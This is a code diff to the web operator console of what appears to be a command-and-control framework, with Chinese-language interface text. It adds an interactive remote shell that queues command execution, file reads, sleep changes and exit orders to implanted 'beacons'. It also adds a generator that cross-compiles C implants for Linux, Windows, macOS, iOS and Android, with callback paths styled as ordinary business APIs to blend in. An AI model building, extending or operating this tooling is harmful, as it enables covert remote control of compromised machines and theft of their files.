-      <button type="submit">排进队列</button>
-      <p id="lite-task-note" class="hint"></p>
-    </form>
-    <form id="lite-res" class="panel"><h3>拉取结果</h3>
-      <div class="row"><label>信标 ID<input name="beaconId"></label><button type="submit">拉取</button></div>
-      <pre id="lite-results" class="output">结果会显示在这里。</pre>
-    </form>`;
+  const enterIsIme = (event) => ime || event.isComposing || event.keyCode === 229;
+  const send = () => {
+    if (ime) return;
+    const line = input.value;
+    input.value = "";
+    return submitLiteLine(b.ID, line);
+  };
+  form.onsubmit = (event) => { event.preventDefault(); };
+  input.onkeydown = (event) => {
+    const hist = state.liteHist[b.ID] || [];
+    if (event.key === "Enter" && !event.shiftKey) {
+      if (enterIsIme(event)) return;
+      event.preventDefault();
+      send();
+      return;
+    }
+    if (event.key === "ArrowUp") {
+      event.preventDefault();
+      if (!hist.length) return;
+      state.liteHistIdx[b.ID] = Math.max(0, (state.liteHistIdx[b.ID] ?? hist.length) - 1);
+      input.value = hist[state.liteHistIdx[b.ID]] || "";
+    } else if (event.key === "ArrowDown") {
+      event.preventDefault();
+      state.liteHistIdx[b.ID] = Math.min(hist.length, (state.liteHistIdx[b.ID] ?? hist.length) + 1);
+      input.value = hist[state.liteHistIdx[b.ID]] || "";
+    } else if (event.key === "l" && event.ctrlKey) {
+      event.preventDefault();
+      state.liteEntries[b.ID] = [];
+      paintLiteLog();
+    } else if (event.key === "c" && event.ctrlKey) {
+      event.preventDefault();
+      input.value = "";
+    }
+  };
+  input.focus();
+}
+
+async function submitLiteLine(id, line) {
+  const b = liteBeacon(id) || { ID: id, Info: {} };
+  const trimmed = line.trim();
+  if (!trimmed) return;
+  const entries = liteEnsure(id);
+  const prompt = litePrompt(b);
+  if (trimmed === ".help") {
+    entries.push({ kind: "cmd", prompt, text: trimmed });
+    entries.push({ kind: "sys", text: "直接输入命令，等心跳带回结果。每次命令独立执行，没有持续工作目录；连着做请写成 cd /tmp && ls。\n.help        本说明\n.clear       清屏（Ctrl+L 同样）\n.sleep 秒数  改这台的回连间隔\n.read 路径   按文件任务读取（不必经过 shell）\n.kill        让植入体退出" });
+    paintLiteLog();
+    return;
+  }
+  if (trimmed === ".clear") {
+    state.liteEntries[id] = [];
+    paintLiteLog();
+    return;
+  }
+  entries.push({ kind: "cmd", prompt, text: trimmed });
+  const hist = state.liteHist[id];
+  if (hist[hist.length - 1] !== trimmed) hist.push(trimmed);
+  state.liteHistIdx[id] = hist.length;
+
+  let payload;
+  if (trimmed === ".kill") {
+    payload = { beaconId: id, type: "exit" };
+  } else if (trimmed.startsWith(".sleep ")) {
+    const interval = Number(trimmed.slice(7).trim());
+    if (!interval || interval < 5 || interval > 86400) {
+      entries.push({ kind: "err", text: "间隔要在 5 到 86400 秒之间" });
+      paintLiteLog();
+      return;
+    }
+    payload = { beaconId: id, type: "sleep", interval };
+  } else if (trimmed.startsWith(".read ")) {
+    const path = trimmed.slice(6).trim();
+    if (!path) {
+      entries.push({ kind: "err", text: "缺少路径" });
+      paintLiteLog();
+      return;
+    }
+    payload = { beaconId: id, type: "read", path };
+  } else {
+    payload = { beaconId: id, type: "exec", cmd: trimmed, timeout: 30 };
+  }
+
+  try {
+    const res = await api("/api/lite/task", { method: "POST", json: payload });
+    const live = liteBeacon(id);
+    if (live) {
+      live.Active = true;
+      live.Queued = (live.Queued || 0) + 1;
+    }
+    if (payload.type === "exit") {
+      entries.push({ kind: "sys", text: `已排队退出（任务 ${res.taskId}），等下次心跳执行。` });
+    } else if (payload.type === "sleep") {
+      entries.push({ kind: "sys", text: `已排队改心跳为 ${payload.interval}s（任务 ${res.taskId}）。` });
+    } else {
+      entries.push({ kind: "wait", taskId: res.taskId, text: "…等待回连" });
+    }
+    updateLiteHb();
+  } catch (err) {
+    entries.push({ kind: "err", text: err.message });
+  }
+  paintLiteLog();
+}
+
+function bindLiteAdmin(cfg) {
   $("lite-listen").onsubmit = async (event) => {
     event.preventDefault();
     const form = new FormData(event.target);
@@ -670,40 +1107,136 @@ async function renderLite(view) {
       $("lite-cfg-note").textContent = "已签发新密钥，config.h 已下载";
     } catch (err) { $("lite-cfg-note").textContent = err.message; }
   };
-  $("lite-task").onsubmit = async (event) => {
+}
+
+function liteAdminHTML(cfg) {
+  return `
+    <form id="lite-listen" class="panel"><h3>回连监听</h3>
+      <p class="hint">C 植入体连这个端口。${cfg.running ? "正在监听：" + esc(cfg.addr) : "当前没在监听。"}平时 ${cfg.idleSec} 秒，打开它的命令行之后 5 分钟内是 ${cfg.fastSec} 秒。</p>
+      <div class="row">
+        <label>监听地址<input name="host" value="0.0.0.0"></label>
+        <label>端口<input name="port" value="8443"></label>
+        <label>路径<input name="path" value="/api/v2/sync"></label>
+        <label>目标看到的地址<input name="url" placeholder="https://c2.example.com:8443"></label>
+      </div>
+      <div class="row">
+        <label>平时回连秒数<input name="idleSec" value="${esc(cfg.idleSec || 10)}"></label>
+        <label>干活时回连秒数<input name="fastSec" value="${esc(cfg.fastSec || 10)}"></label>
+      </div>
+      <button type="submit">${cfg.running ? "重启监听" : "启动监听"}</button>
+      ${cfg.running ? '<button type="button" class="danger" id="lite-stop">停止</button>' : ""}
+      <p id="lite-note" class="hint"></p>
+    </form>
+    <section class="panel"><h3>生成配置</h3>
+      <p class="hint">下载 config.h 放到 implant/lite/，再跑 ./build.sh linux 或 ./build.sh windows。当前密钥：${esc((cfg.secretB64 || "").slice(0, 12))}…。签发新密钥后，已经在跑的旧程序仍然认旧密钥。</p>
+      <button type="button" id="lite-cfg-dl">下载 config.h</button>
+      <button type="button" id="lite-cfg-new">签发新密钥</button>
+      <p id="lite-cfg-note" class="hint"></p>
+    </section>`;
+}
+
+async function renderCImplant(view) {
+  view.innerHTML = `
+    <div class="lite-actions"><button type="button" class="ghost" id="implant-back">返回列表</button></div>
+    <form id="c-gen" class="panel"><h3>生成 C 植入体</h3>
+      <p class="hint">和 Go 走同一个 HTTPS 端口。回连路径自己填，写成普通业务接口。密钥在编译时写进程序，服务器会记住它。先在「监听端口」打开 HTTPS。</p>
+      <div class="row">
+        <label>名称<input name="name" placeholder="留空会自动起名"></label>
+        <label>系统<select name="os">
+          <option value="linux">linux</option>
+          <option value="windows">windows</option>
+          <option value="darwin">macOS</option>
+          <option value="ios">iOS</option>
+          <option value="android">android</option>
+        </select></label>
+        <label>芯片<select name="arch"><option value="arm64">arm64</option><option value="amd64">amd64</option></select></label>
+      </div>
+      <div class="row">
+        <label>回连地址<input id="c-url" name="url" value="https://127.0.0.1:443" placeholder="https://主机:端口" required></label>
+        <label>回连路径<input id="c-path" name="path" placeholder="/api/v1/orders" required></label>
+      </div>
+      <p id="c-url-preview" class="hint">先填回连地址和回连路径。</p>
+      <div class="row">
+        <label>平时回连秒数<input name="idleSec" value="10"></label>
+        <label>干活时回连秒数<input name="fastSec" value="10"></label>
+      </div>
+      <button type="submit">生成并下载</button>
+      <p id="c-gen-note" class="hint">Mac、Linux、Windows 用 Zig 交叉编译。iOS 和安卓也走 Zig，缺 SDK 时会直接说明编不过。编译要一会儿。</p>
+    </form>`;
+  $("implant-back").onclick = () => { state.implantKind = null; render(); };
+  const arch = view.querySelector("[name=arch]");
+  const os = view.querySelector("[name=os]");
+  os.onchange = () => {
+    if (os.value === "windows" || os.value === "ios" || os.value === "android") arch.value = os.value === "windows" ? "amd64" : "arm64";
+  };
+  const previewURL = () => {
+    const base = ($("c-url").value || "").trim().replace(/\/+$/, "");
+    let path = ($("c-path").value || "").trim();
+    if (path && !path.startsWith("/")) path = "/" + path;
+    $("c-url-preview").textContent = base && path ? "植入体将连接 " + base + path : "先填回连地址和回连路径。";
+  };
+  $("c-url").oninput = previewURL;
+  $("c-path").oninput = previewURL;
+  $("c-gen").onsubmit = async (event) => {
     event.preventDefault();
     const form = new FormData(event.target);
-    try {
-      const res = await api("/api/lite/task", { method: "POST", json: {
-        beaconId: form.get("beaconId"), type: form.get("type"), cmd: form.get("cmd"),
-        path: form.get("path"), timeout: Number(form.get("timeout") || 30), interval: Number(form.get("interval") || 180),
-      }});
-      $("lite-task-note").textContent = "已排队，任务 ID " + res.taskId + "，等它下次回连时下发";
-    } catch (err) { $("lite-task-note").textContent = err.message; }
-  };
-  $("lite-res").onsubmit = async (event) => {
-    event.preventDefault();
-    const form = new FormData(event.target);
-    try {
-      const data = await api("/api/lite/results?beacon=" + encodeURIComponent(form.get("beaconId")));
-      const lines = (data.Results || []).map((r) => {
-        const stamp = r.At ? new Date(r.At).toLocaleString() : "";
-        if (r.Kind === "exec") return `[${stamp}] 任务${r.TaskID} 退出码 ${r.Exit}\n${textOf(r.Output)}`;
-        const errs = ["成功", "文件不存在", "没有权限", "文件太大"];
-        return `[${stamp}] 任务${r.TaskID} 读文件 ${errs[r.Err] || "错误" + r.Err}\n${r.Err ? "" : textOf(r.Output)}`;
-      });
-      $("lite-results").textContent = lines.join("\n") || "没有新结果";
-    } catch (err) { $("lite-results").textContent = err.message; }
-  };
-  view.querySelectorAll("[data-del]").forEach((button) => button.onclick = async () => {
-    try {
-      await api("/api/lite/beacon/delete", { method: "POST", json: { id: button.dataset.del } });
-    } catch (err) {
-      $("lite-note").textContent = "删除失败：" + err.message;
+    const note = $("c-gen-note");
+    if (!String(form.get("path") || "").trim()) {
+      note.textContent = "先填写回连路径";
       return;
     }
-    render();
-  });
+    note.textContent = "正在编译…";
+    try {
+      const res = await api("/api/implants/generate-c", { method: "POST", json: {
+        name: form.get("name"), os: form.get("os"), arch: form.get("arch"),
+        url: form.get("url"), path: form.get("path"),
+        idleSec: Number(form.get("idleSec") || 10), fastSec: Number(form.get("fastSec") || 10),
+      }});
+      const blob = await res.blob();
+      downloadBlob(blob, res.headers.get("X-Implant-Name") || "c-implant");
+      note.textContent = "已下载";
+    } catch (err) {
+      note.textContent = err.message;
+    }
+  };
+}
+
+function renderLiteConsole(view) {
+  const b = liteBeacon(state.liteSelected);
+  const info = b.Info || {};
+  $("title").textContent = shownAlias(b.ID, info.Hostname || "");
+  $("subtitle").textContent = `C · ${(info.OS || "").toLowerCase()}/${info.Arch || ""} · PID ${info.PID || "—"}`;
+  const entries = liteEnsure(b.ID);
+  if (!entries.length) {
+    entries.push({ kind: "sys", text: `已连上 ${litePrompt(b).trim()}（${info.OS || "?"}/${info.Arch || "?"}）\n命令像普通 shell 一样输入，结果随心跳回来，会有延迟。输入 .help 看操作符命令。` });
+  }
+  view.innerHTML = `
+    <div class="lite-actions">
+      <button class="ghost" id="lite-back">返回列表</button>
+      ${aliasView("span", "lite", b.ID, info.Hostname || "")}
+      ${targetActions("lite", b.ID)}
+      <span class="hint">回车发送 · 上/下翻历史 · Ctrl+L 清屏</span>
+    </div>
+    <p id="target-note" class="hint">${esc(state.targetNote)}</p>
+    <section class="lite-term">
+      <div class="lite-hb" id="lite-hb"></div>
+      <pre class="lite-log" id="lite-log"></pre>
+      <form id="lite-shell" class="lite-input-row">
+        <span class="lite-prompt" id="lite-prompt">${esc(litePrompt(b))}</span>
+        <input id="lite-input" autocomplete="off" spellcheck="false" placeholder="输入命令">
+        <button type="submit" class="lite-send" tabindex="-1">发送</button>
+      </form>
+    </section>`;
+  paintLiteLog();
+  updateLiteHb();
+  bindLiteShell(b);
+  $("lite-back").onclick = () => { state.liteSelected = null; state.targetNote = ""; render(); };
+  bindTargetActions(view);
+  bindAliasEditors(view);
+  stopLiteTimers();
+  state.liteClock = setInterval(updateLiteHb, 1000);
+  state.litePoll = setInterval(pollLiteConsole, 2000);
+  pollLiteConsole();
 }
 
 function whenISO(v) {
